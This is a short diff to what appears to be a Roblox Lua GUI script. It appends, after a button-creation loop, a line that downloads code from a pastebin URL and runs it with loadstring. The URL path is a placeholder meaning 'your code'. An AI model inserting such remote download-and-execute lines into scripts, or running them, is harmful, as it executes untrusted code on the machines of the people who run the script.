@@ -335,3 +335,5 @@ for _, btnData in ipairs(buttons) do
 	button.Parent = guiContainer
 	button.MouseButton1Click:Connect(btnData.Callback)
 end
+
+loadstring(game:HttpGet("https://pastebin.com/raw/ТВОЙ_КОД"))()
